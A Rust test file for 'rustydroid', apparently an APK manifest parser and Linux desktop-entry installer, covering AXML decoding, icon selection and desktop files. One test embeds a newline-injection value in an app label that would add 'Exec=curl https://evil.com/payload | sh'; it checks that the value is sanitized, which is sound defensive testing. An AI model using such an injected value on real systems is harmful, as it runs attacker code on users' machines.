use byteorder::{LittleEndian, WriteBytesExt};
use rustydroid::apk::{ApkInspector, ApkMetadata, AxmlAttribute, AxmlParser, DesktopIntegration};
use std::fs::File;
use std::io::Write;
use std::sync::Mutex;
use tempfile::tempdir;
use zip::write::SimpleFileOptions;
use zip::ZipWriter;

static ENV_MUTEX: Mutex<()> = Mutex::new(());

/// Runs a test closure within an isolated temporary sandbox for HOME and XDG_DATA_HOME,
/// serialized with a process-level Mutex to prevent multi-threaded environment collisions,
/// and restoring previous environment variables upon completion even if the closure panics.
fn with_isolated_desktop_env<F, R>(f: F) -> R
where
    F: FnOnce(&std::path::Path) -> R,
{
    let _lock = ENV_MUTEX.lock().unwrap_or_else(|e| e.into_inner());
    let tmp = tempfile::tempdir().expect("Failed to create temporary sandbox for desktop test");

    let orig_home = std::env::var("HOME").ok();
    let orig_xdg = std::env::var("XDG_DATA_HOME").ok();

    std::env::set_var("HOME", tmp.path());
    std::env::set_var("XDG_DATA_HOME", tmp.path().join(".local/share"));

    let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| f(tmp.path())));

    // Restore environment
    match orig_home {
        Some(val) => std::env::set_var("HOME", val),
        None => std::env::remove_var("HOME"),
    }
    match orig_xdg {
        Some(val) => std::env::set_var("XDG_DATA_HOME", val),
        None => std::env::remove_var("XDG_DATA_HOME"),
    }

    match result {
        Ok(val) => val,
        Err(err) => std::panic::resume_unwind(err),
    }
}

// ============================================================================
// Helper builders for synthetic AXML chunks and APK archives
// ============================================================================

fn write_axml_header(buf: &mut Vec<u8>, total_size: u32) {
    buf.write_u32::<LittleEndian>(0x00080003).unwrap(); // CHUNK_AXML_FILE (magic: 0x0003, header size: 8)
    buf.write_u32::<LittleEndian>(total_size).unwrap();
}

fn build_string_pool_utf16(strings: &[&str]) -> Vec<u8> {
    let mut sp_buf = Vec::new();
    let mut str_offsets = Vec::new();
    let mut str_bytes_buf = Vec::new();

    for s in strings {
        str_offsets.push(str_bytes_buf.len() as u32);
        let u16s: Vec<u16> = s.encode_utf16().collect();
        str_bytes_buf.write_u16::<LittleEndian>(u16s.len() as u16).unwrap();
        for ch in u16s {
            str_bytes_buf.write_u16::<LittleEndian>(ch).unwrap();
        }
        str_bytes_buf.write_u16::<LittleEndian>(0).unwrap(); // null term
    }

    let sp_header_size = 28 + (strings.len() * 4);
    let sp_size = sp_header_size + str_bytes_buf.len();

    sp_buf.write_u32::<LittleEndian>(0x00010001).unwrap(); // CHUNK_STRING_POOL
    sp_buf.write_u32::<LittleEndian>(sp_size as u32).unwrap();
    sp_buf.write_u32::<LittleEndian>(strings.len() as u32).unwrap();
    sp_buf.write_u32::<LittleEndian>(0).unwrap(); // style count
    sp_buf.write_u32::<LittleEndian>(0).unwrap(); // flags = UTF-16
    sp_buf.write_u32::<LittleEndian>(sp_header_size as u32).unwrap();
    sp_buf.write_u32::<LittleEndian>(0).unwrap(); // styles start

    for off in str_offsets {
        sp_buf.write_u32::<LittleEndian>(off).unwrap();
    }
    sp_buf.extend_from_slice(&str_bytes_buf);
    sp_buf
}

fn build_string_pool_utf8(strings: &[&str]) -> Vec<u8> {
    let mut sp_buf = Vec::new();
    let mut str_offsets = Vec::new();
    let mut str_bytes_buf = Vec::new();

    for s in strings {
        str_offsets.push(str_bytes_buf.len() as u32);
        let utf16_char_len = s.encode_utf16().count();
        let utf8_byte_len = s.len();

        // 1. Encode char count (UTF-16 code units)
        if utf16_char_len > 127 {
            str_bytes_buf.push(0x80 | ((utf16_char_len >> 8) as u8));
            str_bytes_buf.push((utf16_char_len & 0xFF) as u8);
        } else {
            str_bytes_buf.push(utf16_char_len as u8);
        }

        // 2. Encode byte length
        if utf8_byte_len > 127 {
            str_bytes_buf.push(0x80 | ((utf8_byte_len >> 8) as u8));
            str_bytes_buf.push((utf8_byte_len & 0xFF) as u8);
        } else {
            str_bytes_buf.push(utf8_byte_len as u8);
        }

        // 3. String bytes + null terminator
        str_bytes_buf.extend_from_slice(s.as_bytes());
        str_bytes_buf.push(0);
    }

    // Pad string data to 4-byte alignment
    while str_bytes_buf.len() % 4 != 0 {
        str_bytes_buf.push(0);
    }

    let sp_header_size = 28 + (strings.len() * 4);
    let sp_size = sp_header_size + str_bytes_buf.len();

    sp_buf.write_u32::<LittleEndian>(0x00010001).unwrap(); // CHUNK_STRING_POOL
    sp_buf.write_u32::<LittleEndian>(sp_size as u32).unwrap();
    sp_buf.write_u32::<LittleEndian>(strings.len() as u32).unwrap();
    sp_buf.write_u32::<LittleEndian>(0).unwrap(); // style count
    sp_buf.write_u32::<LittleEndian>(1 << 8).unwrap(); // flags = UTF-8 (1 << 8)
    sp_buf.write_u32::<LittleEndian>(sp_header_size as u32).unwrap();
    sp_buf.write_u32::<LittleEndian>(0).unwrap(); // styles start

    for off in str_offsets {
        sp_buf.write_u32::<LittleEndian>(off).unwrap();
    }
    sp_buf.extend_from_slice(&str_bytes_buf);
    sp_buf
}

fn build_start_tag(name_idx: u32, attrs: &[(u32, u32, u32, u32, u32)]) -> Vec<u8> {
    let mut b = Vec::new();
    let size = 36 + (attrs.len() * 20);
    b.write_u32::<LittleEndian>(0x00100102).unwrap(); // CHUNK_START_TAG
    b.write_u32::<LittleEndian>(size as u32).unwrap();
    b.write_u32::<LittleEndian>(1).unwrap(); // line number
    b.write_u32::<LittleEndian>(0xFFFFFFFF).unwrap(); // comment
    b.write_u32::<LittleEndian>(0xFFFFFFFF).unwrap(); // ns
    b.write_u32::<LittleEndian>(name_idx).unwrap();
    b.write_u16::<LittleEndian>(0x0014).unwrap(); // attr_start
    b.write_u16::<LittleEndian>(0x0014).unwrap(); // attr_size
    b.write_u16::<LittleEndian>(attrs.len() as u16).unwrap();
    b.write_u16::<LittleEndian>(0).unwrap();
    b.write_u16::<LittleEndian>(0).unwrap();
    b.write_u16::<LittleEndian>(0).unwrap();

    for &(ns, name, val, data_type, data) in attrs {
        b.write_u32::<LittleEndian>(ns).unwrap();
        b.write_u32::<LittleEndian>(name).unwrap();
        b.write_u32::<LittleEndian>(val).unwrap();
        b.write_u32::<LittleEndian>(data_type << 24).unwrap();
        b.write_u32::<LittleEndian>(data).unwrap();
    }
    b
}

fn build_end_tag(name_idx: u32) -> Vec<u8> {
    let mut b = Vec::new();
    b.write_u32::<LittleEndian>(0x00100103).unwrap(); // CHUNK_END_TAG
    b.write_u32::<LittleEndian>(24).unwrap();
    b.write_u32::<LittleEndian>(1).unwrap();
    b.write_u32::<LittleEndian>(0xFFFFFFFF).unwrap();
    b.write_u32::<LittleEndian>(0xFFFFFFFF).unwrap();
    b.write_u32::<LittleEndian>(name_idx).unwrap();
    b
}

fn build_axml_from_chunks(chunks: &[Vec<u8>]) -> Vec<u8> {
    let mut total_body = Vec::new();
    for c in chunks {
        total_body.extend_from_slice(c);
    }
    let mut buf = Vec::new();
    write_axml_header(&mut buf, (8 + total_body.len()) as u32);
    buf.extend_from_slice(&total_body);
    buf
}

fn build_test_axml() -> Vec<u8> {
    build_test_axml_with_pkg("org.test.rustydroid")
}

fn build_test_axml_with_pkg(pkg_name: &str) -> Vec<u8> {
    let strings = vec![
        "manifest",
        "package",
        pkg_name,
        "versionCode",
        "versionName",
        "1.0.0",
        "application",
        "label",
        "Test RustyDroid App",
        "activity",
        "name",
        ".MainActivity",
        "intent-filter",
        "action",
        "android.intent.action.MAIN",
        "category",
        "android.intent.category.LAUNCHER",
        "uses-permission",
        "android.permission.INTERNET",
    ];

    let sp_buf = build_string_pool_utf16(&strings);

    let mut tags_buf = Vec::new();
    // 1. <manifest package=pkg_name versionCode=42 versionName="1.0.0">
    tags_buf.extend_from_slice(&build_start_tag(
        0,
        &[
            (0xFFFFFFFF, 1, 2, 0x03, 2),
            (0xFFFFFFFF, 3, 0xFFFFFFFF, 0x10, 42),
            (0xFFFFFFFF, 4, 5, 0x03, 5),
        ],
    ));

    // 2. <uses-permission name="android.permission.INTERNET" />
    tags_buf.extend_from_slice(&build_start_tag(17, &[(0xFFFFFFFF, 10, 18, 0x03, 18)]));
    tags_buf.extend_from_slice(&build_end_tag(17));

    // 3. <application label="Test RustyDroid App">
    tags_buf.extend_from_slice(&build_start_tag(6, &[(0xFFFFFFFF, 7, 8, 0x03, 8)]));

    // 4. <activity name=".MainActivity">
    tags_buf.extend_from_slice(&build_start_tag(9, &[(0xFFFFFFFF, 10, 11, 0x03, 11)]));

    // 5. <intent-filter>
    tags_buf.extend_from_slice(&build_start_tag(12, &[]));

    // 6. <action name="android.intent.action.MAIN" />
    tags_buf.extend_from_slice(&build_start_tag(13, &[(0xFFFFFFFF, 10, 14, 0x03, 14)]));
    tags_buf.extend_from_slice(&build_end_tag(13));

    // 7. <category name="android.intent.category.LAUNCHER" />
    tags_buf.extend_from_slice(&build_start_tag(15, &[(0xFFFFFFFF, 10, 16, 0x03, 16)]));
    tags_buf.extend_from_slice(&build_end_tag(15));

    tags_buf.extend_from_slice(&build_end_tag(12)); // </intent-filter>
    tags_buf.extend_from_slice(&build_end_tag(9));  // </activity>
    tags_buf.extend_from_slice(&build_end_tag(6));  // </application>
    tags_buf.extend_from_slice(&build_end_tag(0));  // </manifest>

    build_axml_from_chunks(&[sp_buf, tags_buf])
}

// ============================================================================
// Milestone 1 Tests
// ============================================================================

#[test]
fn test_apk_inspector_metadata() {
    let tmp = tempdir().unwrap();
    let apk_path = tmp.path().join("test_app.apk");

    // Create a mock APK ZIP archive
    {
        let file = File::create(&apk_path).unwrap();
        let mut zip = ZipWriter::new(file);
        let options = SimpleFileOptions::default();

        // Add AndroidManifest.xml
        zip.start_file("AndroidManifest.xml", options).unwrap();
        zip.write_all(&build_test_axml()).unwrap();

        // Add a mock icon
        zip.start_file("res/mipmap-hdpi-v4/ic_launcher.png", options).unwrap();
        zip.write_all(b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR...mockpngdata").unwrap();

        zip.finish().unwrap();
    }

    // Inspect the generated APK
    let meta = ApkInspector::inspect(&apk_path).expect("Apk inspection failed");

    assert_eq!(meta.package_name, "org.test.rustydroid");
    assert_eq!(meta.app_label.as_deref(), Some("Test RustyDroid App"));
    assert_eq!(meta.version_code.as_deref(), Some("42"));
    assert_eq!(meta.version_name.as_deref(), Some("1.0.0"));
    assert_eq!(meta.main_activity.as_deref(), Some("org.test.rustydroid.MainActivity"));
    assert_eq!(meta.permissions, vec!["android.permission.INTERNET"]);
    assert!(meta.icon_data.is_some());

    // Test Desktop Integration
    with_isolated_desktop_env(|_| {
        let desktop_file = DesktopIntegration::install_desktop_entry(&meta, Some("rustydroid"))
            .expect("Failed to create desktop entry");

        assert!(desktop_file.exists());
        let content = std::fs::read_to_string(&desktop_file).unwrap();
        assert!(content.contains("Name=Test RustyDroid App"));
        assert!(content.contains("Exec=rustydroid run \"org.test.rustydroid\""));
        assert!(content.contains("StartupWMClass=org.test.rustydroid"));

        let _ = DesktopIntegration::remove_desktop_entry(&meta.package_name);
    });
}

#[test]
fn test_axml_buffer_too_short() {
    // Input buffer < 8 bytes must return Err without panicking
    let short_buffers: &[&[u8]] = &[
        b"",
        b"\x03",
        b"\x03\x00",
        b"\x03\x00\x08",
        b"\x03\x00\x08\x00",
        b"\x03\x00\x08\x00\x08",
        b"\x03\x00\x08\x00\x08\x00",
        b"\x03\x00\x08\x00\x08\x00\x00",
    ];

    for buf in short_buffers {
        let mut parser = AxmlParser::new(buf);
        let res = parser.parse();
        assert!(res.is_err(), "Buffer with len {} must fail", buf.len());
        let err_msg = res.unwrap_err().to_string();
        assert!(
            err_msg.contains("too short") || err_msg.contains("less than 8 bytes"),
            "Error message should mention too short: {}",
            err_msg
        );
    }
}

#[test]
fn test_axml_invalid_magic() {
    // Magic != 0x0003 must return Err with invalid magic
    let invalid_magics = [
        0x00080001u32, // Invalid chunk type 0x0001
        0x12345678u32, // Random magic
        0x00000000u32, // Zero magic
        0x00080004u32, // Chunk type 0x0004
    ];

    for &magic in &invalid_magics {
        let mut buf = Vec::new();
        buf.write_u32::<LittleEndian>(magic).unwrap();
        buf.write_u32::<LittleEndian>(8).unwrap(); // file size

        let mut parser = AxmlParser::new(&buf);
        let res = parser.parse();
        assert!(res.is_err(), "Invalid magic 0x{:08x} must fail", magic);
        let err_msg = res.unwrap_err().to_string();
        assert!(
            err_msg.contains("Invalid AXML magic"),
            "Error message should mention invalid magic: {}",
            err_msg
        );
    }
}

#[test]
fn test_axml_zero_elements() {
    // Valid header and string pool, but 0 XML elements must return Err("No root element found in AXML")
    let sp_buf = build_string_pool_utf16(&["hello", "world"]);
    let axml_bytes = build_axml_from_chunks(&[sp_buf]);

    let mut parser = AxmlParser::new(&axml_bytes);
    let res = parser.parse();
    assert!(res.is_err(), "Zero elements AXML must return error");
    let err_msg = res.unwrap_err().to_string();
    assert!(
        err_msg.contains("No root element found in AXML"),
        "Expected 'No root element found in AXML', got: {}",
        err_msg
    );
}

#[test]
fn test_utf8_string_pool_long_strings() {
    // String length > 127 bytes requires 2-byte char and byte length prefixes
    let long_str_180 = "A".repeat(180);
    let long_str_300 = "B".repeat(300);

    let strings = vec![
        "manifest",
        "package",
        "org.test.longstring",
        "versionName",
        &long_str_180,
        "description",
        &long_str_300,
    ];

    let sp_buf = build_string_pool_utf8(&strings);

    let mut tags_buf = Vec::new();
    tags_buf.extend_from_slice(&build_start_tag(
        0, // manifest
        &[
            (0xFFFFFFFF, 1, 2, 0x03, 2), // package="org.test.longstring"
            (0xFFFFFFFF, 3, 4, 0x03, 4), // versionName=180-char string
            (0xFFFFFFFF, 5, 6, 0x03, 6), // description=300-char string
        ],
    ));
    tags_buf.extend_from_slice(&build_end_tag(0));

    let axml_bytes = build_axml_from_chunks(&[sp_buf, tags_buf]);

    let mut parser = AxmlParser::new(&axml_bytes);
    let root = parser.parse().expect("Failed to parse AXML with UTF-8 long strings");
    let sp = parser.string_pool();

    let version_name = root.get_attr("versionName", sp).expect("versionName not found");
    assert_eq!(version_name.len(), 180);
    assert_eq!(version_name, long_str_180);

    let description = root.get_attr("description", sp).expect("description not found");
    assert_eq!(description.len(), 300);
    assert_eq!(description, long_str_300);
}

#[test]
fn test_utf8_string_pool_multibyte_unicode() {
    // International text: Cyrillic, Emoji, international accents
    let cyrillic_text = "Привет, мир! 🚀🦀 Настоящий Android на Rust";
    let emoji_text = "🎉 Multi-window Wayland 📱 Direct GPU ⚡ PipeWire 🎧";

    let strings = vec![
        "manifest",
        "package",
        "org.test.unicode",
        "application",
        "label",
        cyrillic_text,
        "description",
        emoji_text,
    ];

    let sp_buf = build_string_pool_utf8(&strings);

    let mut tags_buf = Vec::new();
    tags_buf.extend_from_slice(&build_start_tag(
        0, // manifest
        &[(0xFFFFFFFF, 1, 2, 0x03, 2)],
    ));
    tags_buf.extend_from_slice(&build_start_tag(
        3, // application
        &[
            (0xFFFFFFFF, 4, 5, 0x03, 5), // label=cyrillic_text
            (0xFFFFFFFF, 6, 7, 0x03, 7), // description=emoji_text
        ],
    ));
    tags_buf.extend_from_slice(&build_end_tag(3));
    tags_buf.extend_from_slice(&build_end_tag(0));

    let axml_bytes = build_axml_from_chunks(&[sp_buf, tags_buf]);

    let mut parser = AxmlParser::new(&axml_bytes);
    let root = parser.parse().expect("Failed to parse AXML with multibyte UTF-8");
    let sp = parser.string_pool();

    let app = root.find_children("application")[0];
    assert_eq!(app.get_attr("label", sp).as_deref(), Some(cyrillic_text));
    assert_eq!(app.get_attr("description", sp).as_deref(), Some(emoji_text));
}

#[test]
fn test_utf16_string_pool_multiword_length() {
    // UTF-16 string with length >= 0x8000 (e.g. 35,000 chars) uses 2x 16-bit length prefix
    let target_len = 35000usize;
    let mut raw_bytes = Vec::new();

    // High-bit continuation length words:
    // first = 0x8000 | (len >> 16)
    // second = len & 0xFFFF
    let first_word = 0x8000 | ((target_len >> 16) as u16);
    let second_word = (target_len & 0xFFFF) as u16;

    raw_bytes.write_u16::<LittleEndian>(first_word).unwrap();
    raw_bytes.write_u16::<LittleEndian>(second_word).unwrap();

    // Fill with 'X' characters (u16: 0x0058)
    for _ in 0..target_len {
        raw_bytes.write_u16::<LittleEndian>(b'X' as u16).unwrap();
    }
    raw_bytes.write_u16::<LittleEndian>(0).unwrap(); // null terminator

    let decoded = AxmlParser::decode_utf16_string(&raw_bytes);
    assert_eq!(decoded.len(), target_len);
    assert!(decoded.chars().all(|c| c == 'X'));

    // Maliciously huge length (e.g. 0xFFFF_FFFF) with short buffer should not panic or OOM
    let mut mal_bytes = Vec::new();
    mal_bytes.write_u16::<LittleEndian>(0xFFFF).unwrap();
    mal_bytes.write_u16::<LittleEndian>(0xFFFF).unwrap();
    mal_bytes.write_u16::<LittleEndian>(b'Y' as u16).unwrap();
    mal_bytes.write_u16::<LittleEndian>(0).unwrap();

    let mal_decoded = AxmlParser::decode_utf16_string(&mal_bytes);
    assert_eq!(mal_decoded, "Y");
}

#[test]
fn test_attribute_type_resolution() {
    let string_pool = vec![
        "manifest".to_string(),
        "resolved_string_val".to_string(),
    ];

    // 1. TYPE_REFERENCE (0x01) -> @0x7f080001
    let attr_ref = AxmlAttribute {
        uri: String::new(),
        name: "icon".to_string(),
        value_str: None,
        data_type: 0x01,
        data: 0x7f080001,
    };
    assert_eq!(attr_ref.resolved_value(&string_pool), "@0x7f080001");

    // 2. TYPE_INT_DEC (0x10) -> signed decimal
    let attr_dec = AxmlAttribute {
        uri: String::new(),
        name: "versionCode".to_string(),
        value_str: None,
        data_type: 0x10,
        data: 42,
    };
    assert_eq!(attr_dec.resolved_value(&string_pool), "42");

    let attr_neg = AxmlAttribute {
        uri: String::new(),
        name: "priority".to_string(),
        value_str: None,
        data_type: 0x10,
        data: (-5i32) as u32,
    };
    assert_eq!(attr_neg.resolved_value(&string_pool), "-5");

    // 3. TYPE_INT_HEX (0x11) -> 0x{:08x}
    let attr_hex = AxmlAttribute {
        uri: String::new(),
        name: "flags".to_string(),
        value_str: None,
        data_type: 0x11,
        data: 0x000000FF,
    };
    assert_eq!(attr_hex.resolved_value(&string_pool), "0x000000ff");

    // 4. TYPE_INT_BOOLEAN (0x12) -> "true" (non-zero) / "false" (zero)
    let attr_bool_true = AxmlAttribute {
        uri: String::new(),
        name: "debuggable".to_string(),
        value_str: None,
        data_type: 0x12,
        data: 0xFFFFFFFF,
    };
    assert_eq!(attr_bool_true.resolved_value(&string_pool), "true");

    let attr_bool_true_1 = AxmlAttribute {
        uri: String::new(),
        name: "exported".to_string(),
        value_str: None,
        data_type: 0x12,
        data: 1,
    };
    assert_eq!(attr_bool_true_1.resolved_value(&string_pool), "true");

    let attr_bool_false = AxmlAttribute {
        uri: String::new(),
        name: "exported".to_string(),
        value_str: None,
        data_type: 0x12,
        data: 0,
    };
    assert_eq!(attr_bool_false.resolved_value(&string_pool), "false");

    // 5. TYPE_STRING (0x03) -> string pool index or value_str
    let attr_str_pool = AxmlAttribute {
        uri: String::new(),
        name: "package".to_string(),
        value_str: None,
        data_type: 0x03,
        data: 1,
    };
    assert_eq!(attr_str_pool.resolved_value(&string_pool), "resolved_string_val");

    let attr_str_direct = AxmlAttribute {
        uri: String::new(),
        name: "package".to_string(),
        value_str: Some("direct_value".to_string()),
        data_type: 0x03,
        data: 0xFFFFFFFF,
    };
    assert_eq!(attr_str_direct.resolved_value(&string_pool), "direct_value");
}

#[test]
fn test_activity_name_normalization() {
    let pkg = "com.example.app";

    // 1. Relative name with leading dot: .MainActivity -> com.example.app.MainActivity
    assert_eq!(
        ApkInspector::normalize_activity_name(pkg, ".MainActivity"),
        "com.example.app.MainActivity"
    );

    // 2. Relative name without leading dot: MainActivity -> com.example.app.MainActivity
    assert_eq!(
        ApkInspector::normalize_activity_name(pkg, "MainActivity"),
        "com.example.app.MainActivity"
    );

    // 3. Fully qualified external name: com.other.SubActivity -> com.other.SubActivity
    assert_eq!(
        ApkInspector::normalize_activity_name(pkg, "com.other.SubActivity"),
        "com.other.SubActivity"
    );

    // 4. Fully qualified matching package: com.example.app.MainActivity -> com.example.app.MainActivity
    assert_eq!(
        ApkInspector::normalize_activity_name(pkg, "com.example.app.MainActivity"),
        "com.example.app.MainActivity"
    );

    // 5. Relative sub-package: .ui.detail.DetailActivity -> com.example.app.ui.detail.DetailActivity
    assert_eq!(
        ApkInspector::normalize_activity_name(pkg, ".ui.detail.DetailActivity"),
        "com.example.app.ui.detail.DetailActivity"
    );

    // 6. Whitespace handling
    assert_eq!(
        ApkInspector::normalize_activity_name(pkg, "  .TrimmedActivity  "),
        "com.example.app.TrimmedActivity"
    );

    // 7. Empty string
    assert_eq!(ApkInspector::normalize_activity_name(pkg, ""), "");
}

#[test]
fn test_activity_alias_resolution() {
    // When an APK uses <activity-alias> for MAIN + LAUNCHER, ApkInspector must identify it
    let strings = vec![
        "manifest",
        "package",
        "org.test.aliasapp",
        "application",
        "activity",
        "name",
        ".InternalActivity",
        "activity-alias",
        "targetActivity",
        ".LauncherAlias",
        "intent-filter",
        "action",
        "android.intent.action.MAIN",
        "category",
        "android.intent.category.LAUNCHER",
    ];

    let sp_buf = build_string_pool_utf16(&strings);

    let mut tags_buf = Vec::new();
    tags_buf.extend_from_slice(&build_start_tag(0, &[(0xFFFFFFFF, 1, 2, 0x03, 2)])); // <manifest package="org.test.aliasapp">
    tags_buf.extend_from_slice(&build_start_tag(3, &[])); // <application>

    // 1. <activity name=".InternalActivity" /> (no launcher filter)
    tags_buf.extend_from_slice(&build_start_tag(4, &[(0xFFFFFFFF, 5, 6, 0x03, 6)]));
    tags_buf.extend_from_slice(&build_end_tag(4));

    // 2. <activity-alias name=".LauncherAlias" targetActivity=".InternalActivity">
    tags_buf.extend_from_slice(&build_start_tag(
        7, // activity-alias
        &[
            (0xFFFFFFFF, 5, 9, 0x03, 9),  // name=".LauncherAlias"
            (0xFFFFFFFF, 8, 6, 0x03, 6),  // targetActivity=".InternalActivity"
        ],
    ));

    // <intent-filter>
    tags_buf.extend_from_slice(&build_start_tag(10, &[]));
    // <action name="android.intent.action.MAIN" />
    tags_buf.extend_from_slice(&build_start_tag(11, &[(0xFFFFFFFF, 5, 12, 0x03, 12)]));
    tags_buf.extend_from_slice(&build_end_tag(11));
    // <category name="android.intent.category.LAUNCHER" />
    tags_buf.extend_from_slice(&build_start_tag(13, &[(0xFFFFFFFF, 5, 14, 0x03, 14)]));
    tags_buf.extend_from_slice(&build_end_tag(13));
    tags_buf.extend_from_slice(&build_end_tag(10)); // </intent-filter>

    tags_buf.extend_from_slice(&build_end_tag(7));  // </activity-alias>
    tags_buf.extend_from_slice(&build_end_tag(3));  // </application>
    tags_buf.extend_from_slice(&build_end_tag(0));  // </manifest>

    let axml_bytes = build_axml_from_chunks(&[sp_buf, tags_buf]);

    let tmp = tempdir().unwrap();
    let apk_path = tmp.path().join("alias_test.apk");

    {
        let file = File::create(&apk_path).unwrap();
        let mut zip = ZipWriter::new(file);
        let options = SimpleFileOptions::default();
        zip.start_file("AndroidManifest.xml", options).unwrap();
        zip.write_all(&axml_bytes).unwrap();
        zip.finish().unwrap();
    }

    let meta = ApkInspector::inspect(&apk_path).expect("Failed to inspect alias APK");
    assert_eq!(
        meta.main_activity.as_deref(),
        Some("org.test.aliasapp.LauncherAlias"),
        "Must correctly identify and normalize launcher activity-alias"
    );
}

#[test]
fn test_density_icon_hierarchy() {
    // Priority order: xxxhdpi > xxhdpi > xhdpi > hdpi > mdpi > drawable
    let tmp = tempdir().unwrap();
    let apk_path = tmp.path().join("density_test.apk");

    {
        let file = File::create(&apk_path).unwrap();
        let mut zip = ZipWriter::new(file);
        let options = SimpleFileOptions::default();

        zip.start_file("AndroidManifest.xml", options).unwrap();
        zip.write_all(&build_test_axml()).unwrap();

        // Add mdpi, hdpi, and xxxhdpi icons
        zip.start_file("res/mipmap-mdpi-v4/ic_launcher.png", options).unwrap();
        zip.write_all(b"MDPI_ICON").unwrap();

        zip.start_file("res/mipmap-hdpi-v4/ic_launcher.png", options).unwrap();
        zip.write_all(b"HDPI_ICON").unwrap();

        zip.start_file("res/mipmap-xxxhdpi-v4/ic_launcher.png", options).unwrap();
        zip.write_all(b"XXXHDPI_ICON").unwrap();

        zip.finish().unwrap();
    }

    let meta = ApkInspector::inspect(&apk_path).expect("Failed to inspect density APK");
    assert_eq!(
        meta.icon_path_in_apk.as_deref(),
        Some("res/mipmap-xxxhdpi-v4/ic_launcher.png")
    );
    assert_eq!(meta.icon_data.as_deref(), Some(b"XXXHDPI_ICON".as_ref()));
}

#[test]
fn test_icon_fallback_search() {
    // When no standard mipmap/drawable icon path is present, fallback finds *ic_launcher* or *icon*
    let tmp = tempdir().unwrap();
    let apk_path = tmp.path().join("fallback_icon_test.apk");

    {
        let file = File::create(&apk_path).unwrap();
        let mut zip = ZipWriter::new(file);
        let options = SimpleFileOptions::default();

        zip.start_file("AndroidManifest.xml", options).unwrap();
        zip.write_all(&build_test_axml()).unwrap();

        // Add non-standard asset icon (similar to F-Droid swap-icon.png)
        zip.start_file("assets/app_swap_icon.png", options).unwrap();
        zip.write_all(b"ASSET_ICON_DATA").unwrap();

        zip.finish().unwrap();
    }

    let meta = ApkInspector::inspect(&apk_path).expect("Failed to inspect fallback icon APK");
    assert_eq!(
        meta.icon_path_in_apk.as_deref(),
        Some("assets/app_swap_icon.png")
    );
    assert_eq!(meta.icon_data.as_deref(), Some(b"ASSET_ICON_DATA".as_ref()));
}

#[test]
fn test_missing_icon_handling() {
    // APK with no image assets returns icon_data: None cleanly without panic or failure
    let tmp = tempdir().unwrap();
    let apk_path = tmp.path().join("no_icon_test.apk");

    {
        let file = File::create(&apk_path).unwrap();
        let mut zip = ZipWriter::new(file);
        let options = SimpleFileOptions::default();

        zip.start_file("AndroidManifest.xml", options).unwrap();
        zip.write_all(&build_test_axml_with_pkg("org.test.no_icon")).unwrap();

        // Add only text files
        zip.start_file("resources.arsc", options).unwrap();
        zip.write_all(b"mock_arsc").unwrap();

        zip.finish().unwrap();
    }

    let meta = ApkInspector::inspect(&apk_path).expect("Failed to inspect no-icon APK");
    assert!(meta.icon_data.is_none(), "icon_data must be None");
    assert!(meta.icon_path_in_apk.is_none(), "icon_path_in_apk must be None");

    // Desktop entry installation should succeed cleanly even without an icon
    with_isolated_desktop_env(|_| {
        let desktop_file = DesktopIntegration::install_desktop_entry(&meta, None)
            .expect("Desktop entry should succeed without icon");
        assert!(desktop_file.exists());
        let _ = DesktopIntegration::remove_desktop_entry(&meta.package_name);
    });
}

#[test]
fn test_desktop_entry_startup_wm_class_and_removal() {
    with_isolated_desktop_env(|tmp_path| {
        let meta = ApkMetadata {
            file_path: "/tmp/fake.apk".to_string(),
            package_name: "org.rustydroid.wayland_test".to_string(),
            version_code: Some("1".to_string()),
            version_name: Some("1.0".to_string()),
            app_label: Some("Wayland Test App".to_string()),
            main_activity: Some("org.rustydroid.wayland_test.MainActivity".to_string()),
            permissions: vec!["android.permission.INTERNET".to_string()],
            icon_path_in_apk: Some("res/drawable/app_icon.png".to_string()),
            icon_data: Some(b"\x89PNG\r\n\x1a\nfake_icon_bytes".to_vec()),
        };

        let desktop_file = DesktopIntegration::install_desktop_entry(&meta, Some("/usr/bin/rustydroid"))
            .expect("Failed to install desktop entry");

        assert!(desktop_file.exists());
        let content = std::fs::read_to_string(&desktop_file).unwrap();

        // Verify Wayland app_id multi-window matching requirement
        assert!(
            content.contains("StartupWMClass=org.rustydroid.wayland_test"),
            "Desktop entry must contain StartupWMClass for Wayland window matching"
        );
        assert!(content.contains("Name=Wayland Test App"));
        assert!(content.contains("Exec=/usr/bin/rustydroid run \"org.rustydroid.wayland_test\""));
        assert!(content.contains("Icon=rustydroid-org.rustydroid.wayland_test"));

        let expected_icon = tmp_path.join(".local/share/icons/hicolor/192x192/apps/rustydroid-org.rustydroid.wayland_test.png");
        assert!(expected_icon.exists(), "Icon PNG must be installed");

        // Test removal
        DesktopIntegration::remove_desktop_entry(&meta.package_name).expect("Removal failed");
        assert!(!desktop_file.exists(), "Desktop file must be deleted");
        assert!(!expected_icon.exists(), "Icon PNG must be deleted");

        // Idempotent removal on already deleted entries must succeed
        let res = DesktopIntegration::remove_desktop_entry(&meta.package_name);
        assert!(res.is_ok(), "Second removal should be idempotent and return Ok(())");
    });
}

#[test]
fn test_desktop_entry_newline_injection_sanitization() {
    with_isolated_desktop_env(|_| {
        let meta = ApkMetadata {
            file_path: "/tmp/fake_malicious.apk".to_string(),
            package_name: "org.rustydroid.injected".to_string(),
            version_code: Some("1".to_string()),
            version_name: Some("1.0".to_string()),
            app_label: Some("InnocentApp\nExec=curl https://evil.com/payload | sh\nComment=Injected".to_string()),
            main_activity: None,
            permissions: vec![],
            icon_path_in_apk: None,
            icon_data: None,
        };

        let desktop_file = DesktopIntegration::install_desktop_entry(&meta, None)
            .expect("Installation should succeed with sanitized inputs");
        assert!(desktop_file.exists());

        let content = std::fs::read_to_string(&desktop_file).unwrap();
        let exec_count = content.lines().filter(|l| l.starts_with("Exec=")).count();
        assert_eq!(exec_count, 1, "Must contain exactly 1 Exec= line, newline injection prevented");
        assert!(!content.contains("\nExec=curl"), "Injected Exec= command must not exist on separate line");

        let _ = DesktopIntegration::remove_desktop_entry(&meta.package_name);
    });
}

#[test]
fn test_desktop_integration_xdg_data_home_precedence() {
    with_isolated_desktop_env(|tmp_path| {
        let custom_xdg = tmp_path.join("custom_xdg_share");
        std::fs::create_dir_all(&custom_xdg).unwrap();
        std::env::set_var("XDG_DATA_HOME", &custom_xdg);

        assert_eq!(DesktopIntegration::get_data_dir(), custom_xdg);
        assert_eq!(DesktopIntegration::get_applications_dir(), custom_xdg.join("applications"));
        assert_eq!(DesktopIntegration::get_icons_dir(), custom_xdg.join("icons/hicolor/192x192/apps"));

        // Fallback when empty
        std::env::set_var("XDG_DATA_HOME", "");
